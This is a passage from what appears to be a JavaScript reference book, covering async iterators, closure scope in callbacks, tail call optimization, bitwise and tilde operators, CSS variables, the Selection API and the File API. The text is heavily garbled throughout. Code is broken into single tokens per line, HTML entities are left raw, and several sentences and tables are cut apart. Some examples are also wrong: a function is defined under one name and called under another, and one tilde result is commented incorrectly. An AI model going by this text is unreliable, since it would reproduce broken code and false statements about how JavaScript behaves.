in Chrome Canary 60 with

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 82.1: Basics
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  next
  

  

A JavaScript Iterator is an object with a .() method, which returns an
IteratorItem, which is an object with

  
  boolean
  

  

  
  value
  

  

  -
  any              &bsol;and                       done
  -  

  -

: &lt;: &lt;&gt;.

  -
  next   () method, which returns a          Promise    &lt;   IteratorItem
    -  

  -

A JavaScript AsyncIterator is an object with a .&gt;, a *promise* for
the next value.
>
To create an AsyncIterator, we can use the *async generator* syntax:

*/&ast;&ast;*

*&ast; Returns a promise which resolves after time had passed.*

*&ast;/*

**const**

delay

=

time

=&gt;

**new**

Promise

(

resolve

=&gt;

setTimeout

(

resolve

,

time

)

)

;

async

**function**

&ast;

delayedRange

(

max

)

{

**for**

(

**let**

i

=

0

;

i

&lt;

max

;

i

++

)

{

await delay

(

1000

)

;

yield i

;

}

}

The delayedRange function will take a maximum number, and returns an
AsyncIterator, which yields numbers from 0 to that number, in 1 second
intervals.
>
Usage:

**for**

await

(

**let**

number of delayedRange

(

10

)

)

{

console.

log

(

number

)

;

}

  
  **for** await of
  

  

  
  **for** await of
  

  

The loop is another piece of new syntax, available only inside of
async functions, as well as async generators. Inside the loop, the
values yielded (which, remember, are Promises) are unwrapped, so the
Promise is hidden away. Within the loop, you can deal with the direct
values (the yielded numbers), the loop will wait for the Promises on
your behalf.

  
  **for** await of
  

  

The above example will wait 1 second, log 0, wait another second, log
1, and so on, until it logs 9. At which point the AsyncIterator will
be done, and the loop will exit.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 83: How to make iterator usable inside async callback function
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

When using async callback we need to consider scope. **Especially** if
inside a loop. This simple article shows what not to do and a simple
working example.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

pipeline

=

{

}

;

*// (&hellip;) adding things in pipeline*

**for**

(

**var**

key

**in**

pipeline

)

{

fs.

stat

(

pipeline

&lbrack;

key

&rbrack;

.

path

,

**function**

(

err

,

stats

)

{

**if**

(

err

)

{

*// clear that one*

**delete**

pipeline

&lbrack;

key

&rbrack;

;

**return**

;

}

*// (&hellip;)*

pipeline

&lbrack;

key

&rbrack;

.

count

++

;

}

)

;

}

The problem is that there is only one instance of **var key**. All
callbacks will share the same key instance. At the time the callback
will fire, the key will most likely have been incremented and not
pointing to the element we are receiving the stats for.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 83.2: Correct Writing
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

pipeline

=

{

}

;

*// (&hellip;) adding things in pipeline*

**var**

processOneFile

=

**function**

(

key

)

{

fs.

stat

(

pipeline

&lbrack;

key

&rbrack;

.

path

,

**function**

(

err

,

stats

)

{

**if**

(

err

)

{

*// clear that one*

**delete**

pipeline

&lbrack;

key

&rbrack;

;

**return**

;

}

*// (&hellip;)*

pipeline

&lbrack;

key

&rbrack;

.

count

++

;

}

)

;

}

;

*// verify it is not growing*

**for**

(

**var**

key

**in**

pipeline

)

{

processOneFileInPipeline

(

key

)

;

}

By creating a new function, we are scoping **key** inside a function
so all callback have their own key instance.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 84: Tail Call Optimization
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 84.1: What is Tail Call Optimization (TCO)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

TCO is only available in strict mode
>
As always check browser and JavaScript implementations for support of
any language features, and as with any JavaScript feature or syntax,
it may change in the future.
>
It provides a way to optimise recursive and deeply nested function
calls by eliminating the need to push function state onto the global
frame stack, and avoiding having to step down through each calling
function by returning directly to the initial calling function.

**function**

a

(

)

{

**return**

b

(

)

;

*// 2*

}

**function**

b

(

)

{

**return**

1

;

*// 3*

}

a

(

)

;

*// 1*

Without TCO the call to a() creates a new frame for that function.
When that function calls b() the a()&apos;s frame is pushed onto the frame
stack and a new frame is created for function b()
>
When b() return to a() a()&apos;s frame is popped from the frame stack. It
immediately return to the global frame and thus does not use any of
the states save on the stack.
>
TCO recognises that the call from a() to b() is at the tail of
function a() and thus there is no need to push a()&apos;s state onto the
frame stack. When b(0) returns rather than returning to a() it returns
directly to the global frame. Further optimising by eliminating the
intermediate steps.
>
TCO allows for recursive functions to have indefinite recursion as the
frame stack will not grow with each recursive call. Without TCO
recursive function had a limited recursive depth.
>
**Note** TCO is a JavaScript engine implementation feature, it cannot
be implemented via a transpiler if the browser does not support it.
There is no additional syntax in the spec required to implement TCO
and thus there is concern that TCO may break the web. Its release into
the world is cautious and may require browser/engine specific flags to
be set for the perceivable future.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 84.2: Recursive loops
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Tail Call Optimisation makes it possible to safely implement recursive
loops without concern for call stack overflow or the overhead of a
growing frame stack.

**function**

indexOf

(

array

,

predicate

,

i

=

0

)

{

**if**

(

0

&lt;=

i

&&

i

&lt;

array.

length

)

{

**if**

(

predicate

(

array

&lbrack;

i

&rbrack;

)

)

{

**return**

i

;

}

**return**

indexOf

(

array

,

predicate

,

i

&plus;

1

)

;

*// the tail call*

}

}

indexOf

(

&lbrack;

1

,

2

,

3

,

4

,

5

,

6

,

7

&rbrack;

,

x

=&gt;

x

===

5

)

;

*// returns index of 5 which is 4*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 85: Bitwise Operators - Real World Examples (snippets)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

a

=

11

,

b

=

22

;

a

=

a

&Hat;

b

;

b

=

a

&Hat;

b

;

a

=

a

&Hat;

b

;

console.

log

(

&quot;a = &quot;

&plus;

a

&plus;

&quot;; b = &quot;

&plus;

b

)

;

*// a is now 22 and b is now 11*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 85.2: Faster multiplication or division by powers of 2
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  13 &ast; (10 &ast;&ast; 2)
  

  

Shifting bits left (right) is equivalent to multiplying (dividing) by
2. It&apos;s the same in base 10: if we &quot;left-shift&quot; 13 by 2 places, we
get 1300, or . And if we take 12345 and &quot;right-shift&quot; by 3 places
and then remove the

  
  Math.floor(12345 / (10 &ast;&ast;   . So if we want to multiply a      2 &ast;&ast;
  3))                           variable by                        n
    

  

decimal part, we get 12, or , we can just left-shift by n bits.

console.

log

(

13

&ast;

(

2

&ast;&ast;

6

)

)

*//13 &ast; 64 = 832*

console.

log

(

13

&lt;&lt;

6

)

*// 832*

  
  2 &ast;&ast; n
  

  

Similarly, to do (floored) integer division by , we can right shift by
n bits. Example:

console.

log

(

1000

/

(

2

&ast;&ast;

4

)

)

*//1000 / 16 = 62.5*

console.

log

(

1000

&gt;&gt;

4

)

*// 62*

It even works with negative numbers:

console.

log

(

&minus;

80

/

(

2

&ast;&ast;

3

)

)

*//-80 / 8 = -10*

console.

log

(

&minus;

80

&gt;&gt;

3

)

*// -10*

In reality, speed of arithmetic is unlikely to significantly impact
how long your code takes to run, unless you are doing on the order of
100s of millions of computations. But C programmers love this sort of
thing!

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 85.3: Number&apos;s Parity Detection with Bitwise AND
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Instead of this (unfortunately too often seen in the real code)
&quot;masterpiece&quot;:

**function**

isEven

(

n

)

{

**return**

n

&percnt;

2

==

0

;

}

**function**

isOdd

(

n

)

{

**if**

(

isEven

(

n

)

)

{

**return**

**false**

;

}

**else**

{

**return**

**true**

;

}

}

You can do the parity check much more effective and simple:

**if**

(

n

&

1

)

{

console.

log

(

&quot;ODD!&quot;

)

;

}

**else**

{

console.

log

(

&quot;EVEN!&quot;

)

;

}

(this is actually valid not only for JavaScript)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 86: Tilde &bsol;~
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The &bsol;~ operator looks at the binary representation of the values of
the expression and does a bitwise negation operation on it.
>
Any digit that is a 1 in the expression becomes a 0 in the result. Any
digit that is a 0 in the expression becomes a 1 in the result.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 86.1: &bsol;~ Integer
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The following example illustrates use of the bitwise NOT (&bsol;~) operator
on integer numbers.

**let**

number

=

3

;

**let**

complement

=

&bsol;~number

;

Result of the complement number equals to -4;

**Expression Binary value Decimal value**

3 00000000 00000000 00000000 00000011 3

&bsol;~3

11111111

11111111

11111111

11111100

-4

To simplify this, we can think of it as function

f

(

n

)

=

&minus;

(

n

&plus;

1

)

.

**let**

a

=

&bsol;~

&minus;

2

;

*// a is now 1*

**let**

b

=

&bsol;~

&minus;

1

;

*// b is now 0*

**let**

c

=

&bsol;~

0

;

*// c is now -1*

**let**

d

=

&bsol;~

1

;

*// d is now -2*

**let**

e

=

&bsol;~

2

;

*// e is now -3*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 86.2: &bsol;~&bsol;~ Operator
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Double Tilde &bsol;~&bsol;~ will perform bitwise NOT operation twice.

The following example illustrates use of the bitwise NOT (&bsol;~&bsol;~)
operator on decimal numbers.

To keep the example simple, decimal number 3.5 will be used, cause of
it&apos;s simple representation in binary format.

**let**

number

=

3.5

;

**let**

complement

=

&bsol;~number

;

Result of the complement number equals to -4;

**Expression Binary value Decimal value**

3 00000000 00000000 00000000 00000011 3

&bsol;~&bsol;~3 00000000 00000000 00000000 00000011 3

  
  00000000 00000011.1
  

  

3.53.5

&bsol;~&bsol;~3.5 00000000 00000011 3

  
  integer
  

  

  
  f2
  

  

  
  g2
  

  

To simplify this, we can think of it as functions (n) = -(-(n+1) + 1)
and (n) = -(-((n)+1) + 1).
>
**f2(n)** will leave the integer number as it is.

**let**

a

=

&bsol;~&bsol;~

&minus;

2

;

*// a is now -2*

**let**

b

=

&bsol;~&bsol;~

&minus;

1

;

*// b is now -1*

**let**

c

=

&bsol;~&bsol;~

0

;

*// c is now 0*

**let**

d

=

&bsol;~&bsol;~

1

;

*// d is now 1*

**let**

e

=

&bsol;~&bsol;~

2

;

*// e is now 2*

**g2(n)** will essentially round positive numbers down and negative
numbers up.

**let**

a

=

&bsol;~&bsol;~

&minus;

2.5

;

*// a is now -2*

**let**

b

=

&bsol;~&bsol;~

&minus;

1.5

;

*// b is now -1*

**let**

c

=

&bsol;~&bsol;~

0.5

;

*// c is now 0*

**let**

d

=

&bsol;~&bsol;~

1.5

;

*// d is now 1*

**let**

e

=

&bsol;~&bsol;~

2.5

;

*// e is now 2*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 86.3: Converting Non-numeric values to Numbers
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

&bsol;~&bsol;~ Could be used on non-numeric values. A numeric expression will be
first converted to a number and then performed bitwise NOT operation
on it.
>
If expression cannot be converted to numeric value, it will convert to
0.
>
**true** and **false** bool values are exceptions, where **true** is
presented as numeric value 1 and **false** as 0

**let**

a

=

&bsol;~&bsol;~

&quot;-2&quot;

;

*// a is now -2*

**let**

b

=

&bsol;~&bsol;~

&quot;1&quot;

;

*// b is now -1*

**let**

c

=

&bsol;~&bsol;~

&quot;0&quot;

;

*// c is now 0*

**let**

d

=

&bsol;~&bsol;~

&quot;true&quot;

;

*// d is now 0*

**let**

e

=

&bsol;~&bsol;~

&quot;false&quot;

;

*// e is now 0*

**let**

f

=

&bsol;~&bsol;~

**true**

;

*// f is now 1*

**let**

g

=

&bsol;~&bsol;~

**false**

;

*// g is now 0*

**let**

h

=

&bsol;~&bsol;~

&quot;&quot;

;

*// h is now 0*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 86.4: Shorthands
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

We can use &bsol;~ as a shorthand in some everyday scenarios.

We know that &bsol;~ converts -1 to 0, so we can use it with indexOf on
array. **indexOf**

**let**

items

=

&lbrack;

&apos;foo&apos;

,

&apos;bar&apos;

,

&apos;baz&apos;

&rbrack;

;

**let**

el

=

&apos;a&apos;

;

**if**

(

items.

indexOf

(

&apos;a&apos;

)

!==

&minus;

1

)

{

}

or

**if**

(

items.

indexOf

(

&apos;a&apos;

)

&gt;=

0

)

{

}

**can be re-written as if** (&bsol;~items.indexOf(&apos;a&apos;)) {}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 86.5: &bsol;~ Decimal
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The following example illustrates use of the bitwise NOT (&bsol;~) operator
on decimal numbers.
>
To keep the example simple, decimal number 3.5 will be used, cause of
it&apos;s simple representation in binary format.

**let**

number

=

3.5

;

**let**

complement

=

&bsol;~number

;

Result of the complement number equals to -4;

**Expression Binary value Decimal value**

  
  00000000 00000010.1
  

  

3.53.5

&bsol;~3.5

11111111

11111100

-4

To simplify this, we can think of it as function

f

(

n

)

=

&minus;

(

integer

(

n

)

&plus;

1

)

.

**let**

a

=

&bsol;~

&minus;

2.5

;

*// a is now 1*

**let**

b

=

&bsol;~

&minus;

1.5

;

*// b is now 0*

**let**

c

=

&bsol;~

0.5

;

*// c is now -1*

**let**

d

=

&bsol;~

1.5

;

*// c is now -2*

**let**

e

=

&bsol;~

2.5

;

*// c is now -3*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 87: Using JavaScript to get/set CSS custom variables
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 87.1: How to get and set CSS variable property values
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

To get a value use the .getPropertyValue() method

element.

style

.

getPropertyValue

(

&quot;&bsol;var&quot;

)

To set a value use the .setProperty() method.

element.

style

.

setProperty

(

&quot;&bsol;var&quot;

,

&quot;NEW_VALUE&quot;

)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 88: Selection API
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Parameter Details**

If the node is a Text node, it is the number of characters from the
beginning of startNode to where the

startOffset range begins. Otherwise, it is the number of child nodes
between the beginning of startNode to where the range begins.

If the node is a Text node, it is the number of characters from the
beginning of startNode to where the

endOffset range ends. Otherwise, it is the number of child nodes
between the beginning of startNode to where the range ends.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 88.1: Get the text of the selection
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**let**

sel

=

document.

getSelection

(

)

;

**let**

text

=

sel.

toString

(

)

;

console.

log

(

text

)

;

*// logs what the user selected*

Alternatively, since the toString member function is called
automatically by some functions when converting the object to a
string, you don&apos;t always have to call it yourself.

console.

log

(

document.

getSelection

(

)

)

;

## Section 88.2: Deselect everything that is selected

**let**

sel

=

document.

getSelection

(

)

;

sel.

removeAllRanges

(

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 88.3: Select the contents of an element
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**let**

sel

=

document.

getSelection

(

)

;

**let**

myNode

=

document.

getElementById

(

&apos;element-to-select&apos;

)

;

**let**

range

=

document.

createRange

(

)

;

range.

selectNodeContents

(

myNode

)

;

sel.

addRange

(

range

)

;

It may be necessary to first remove all the ranges of the previous
selection, as most browsers don&apos;t support multiple ranges.

# Chapter 89: File API, Blobs and FileReaders

  
  **Property/Method**         **Description**
   
  error                       A error that occurred while reading the
                              file.

  readyState                  Contains the current state of the
                              FileReader.

  result                      Contains the file contents.

  onabort                     Triggered when the operation is aborted.

  onerror                     Triggered when an error is encountered.

  onload                      Triggered when the file has loaded.

  onloadstart                 Triggered when the file loading operation
                              has started.

  onloadend                   Triggered when the file loading operation
                              has ended.

  onprogress                  Triggered whilst reading a Blob.
  

  
  abort
  

  

() Aborts the current operation.

  
  readAsArrayBuffer                                      (   blob
    

  

) Starts reading the file as an ArrayBuffer.

  
  readAsDataURL                                       (   blob
  -  

  

) Starts reading the file as a data url/uri.

  
  readAsText                  (   blob       &lbrack;,   encoding
    - - -

  

Starts reading the file as a text file. Not able to read binary files.
Use
>
&rbrack;)
>
readAsArrayBuffer instead.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.1: Read file as string
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Make sure to have a file input on your page:

**&lt;**

**input**

type

=

&quot;file&quot;

id

=

&quot;upload&quot;

**&gt;**

Then in JavaScript:

document.

getElementById

(

&apos;upload&apos;

)

.

addEventListener

(

&apos;change&apos;

,

readFileAsString

)

**function**

readFileAsString

(

)

{

**var**

files

=

**this**

.

files

;

**if**

(

files.

length

===

0

)

{

console.

log

(

&apos;No file is selected&apos;

)

;

**return**

;

}

**var**

reader

=

**new**

FileReader

(

)

;

reader.

onload

=

**function**

(

event

)

{

console.

log

(

&apos;File content:&apos;

,

event.

target

.

result

)

;

}

;

reader.

readAsText

(

files

&lbrack;

0

&rbrack;

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.2: Read file as dataURL
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  type                      =      &quot;file&quot;
    

  

Reading the contents of a file within a web application can be
accomplished by utilizing the HTML5 File API. First, add an input with
in your HTML:

**&lt;**

**input**

type

=

&quot;file&quot;

id

=

&quot;upload&quot;

**&gt;**

Next, we&apos;re going to add a change listener on the file-input. This
examples defines the listener via JavaScript, but it could also be
added as attribute on the input element. This listener gets triggered
every time a new file has been selected. Within this callback, we can
read the file that was selected and perform further actions (like
creating an image with the contents of the selected file):

document.

getElementById

(

&apos;upload&apos;

)

.

addEventListener

(

&apos;change&apos;

,

showImage

)

;

**function**

showImage

(

evt

)

{

**var**

files

=

evt.

target

.

files

;

**if**

(

files.

length

===

0

)

{

console.

log

(

&apos;No files selected&apos;

)

;

**return**

;

}

**var**

reader

=

**new**

FileReader

(

)

;

reader.

onload

=

**function**

(

event

)

{

**var**

img

=

**new**

Image

(

)

;

img.

onload

=

**function**

(

)

{

document.

body

.

appendChild

(

img

)

;

}

;

img.

src

=

event.

target

.

result

;

}

;

reader.

readAsDataURL

(

files

&lbrack;

0

&rbrack;

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.3: Slice a file
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  blob.slice
  

  

The () method is used to create a new Blob object containing the data
in the specified range of bytes of the source Blob. This method is
usable with File instances too, since File extends Blob.
>
Here we slice a file in a specific amount of blobs. This is useful
especially in cases where you need to process files that are too large
to read in memory all in once. We can then read the chunks one by one
using FileReader.

*/&ast;&ast;*

*&ast; &bsol;@param {File&vert;Blob} - file to slice*

*&ast; &bsol;@param {Number} - chunksAmount*

*&ast; &bsol;@return {Array} - an array of Blobs*

*&ast;&ast;/*

**function**

sliceFile

(

file

,

chunksAmount

)

{

**var**

byteIndex

=

0

;

**var**

chunks

=

&lbrack;

&rbrack;

;

**for**

(

**var**

i

=

0

;

i

&lt;

chunksAmount

;

i

+=

1

)

{

**var**

byteEnd

=

Math

.

ceil

(

(

file.

size

/

chunksAmount

)

&ast;

(

i

&plus;

1

)

)

;

chunks.

push

(

file.

slice

(

byteIndex

,

byteEnd

)

)

;

byteIndex

+=

(

byteEnd

&minus;

byteIndex

)

;

}

**return**

chunks

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.4: Get the properties of the file
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

If you want to get the properties of the file (like the name or the
size) you can do it before using the File Reader. If we have the
following html piece of code:

**&lt;**

**input**

type

=

&quot;file&quot;

id

=

&quot;newFile&quot;

**&gt;**

You can access the properties directly like this:

document.

getElementById

(

&apos;newFile&apos;

)

.

addEventListener

(

&apos;change&apos;

,

getFile

)

;

**function**

getFile

(

event

)

{

**var**

files

=

event.

target

.

files

,

file

=

files

&lbrack;

0

&rbrack;

;

console.

log

(

&apos;Name of the file&apos;

,

file.

name

)

;

console.

log

(

&apos;Size of the file&apos;

,

file.

size

)

;

}

You can also get easily the following attributes: lastModified
(Timestamp), lastModifiedDate (Date), and type (File

Type)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.5: Selecting multiple files and restricting file types
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The HTML5 file API allows you to restrict which kind of files are
accepted by simply setting the accept attribute on a file input, e.g.:

**&lt;**

**input**

type

=

&quot;file&quot;

accept

=

&quot;image/jpeg&quot;

**&gt;**

  
  image             /   jpeg           ,   image             /   png
        -

  

Specifying multiple MIME types separated by a comma (e.g. ) or using
wildcards (e.g.

  
  image*/&ast;*
  

  

for allowing all types of images) give you a quick and powerful way to
restrict the type of files you want to select. Here&apos;s an example for
allowing any image or video:

**&lt;**

**input**

type

=

&quot;file&quot;

accept

=

&quot;image/&ast;,video&ast;&quot;

**&gt;**

By default, the file input lets the user select a single file. If you
want to enable multiple file selection, simply add the multiple
attribute:

**&lt;**

**input**

type

=

&quot;file&quot;

multiple

**&gt;**

You can then read all the selected files via the file input&apos;s files
array. See read file as dataUrl

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 89.6: Client side csv download using Blob
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**function**

downloadCsv

(

)

{

**var**

blob

=

**new**

Blob

(

&lbrack;

csvString

&rbrack;

)

;

**if**

(

window.

navigator

.

msSaveOrOpenBlob

)

{

window.

navigator

.

msSaveBlob

(

blob

,

&quot;filename.csv&quot;

)

;

}

**else**

{

**var**

a

=

window.

document

.

createElement

(

&quot;a&quot;

)

;

a&period;

href

=

window.

URL

.

createObjectURL

(

blob

,

{

type

:

&quot;text/plain&quot;

}

)

;

a&period;

download

=

&quot;filename.csv&quot;

;

document.

body

.

appendChild

(

a

)

;

a&period;

click

(

)

;

document.

body

.

removeChild

(

a

)

;

}

}

**var**

string

=

&quot;a1,a2,a3&quot;

;

downloadCSV

(

string

)

;

Source reference ; <https://github.com/mholt/PapaParse/issues/175>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 90: Notifications API
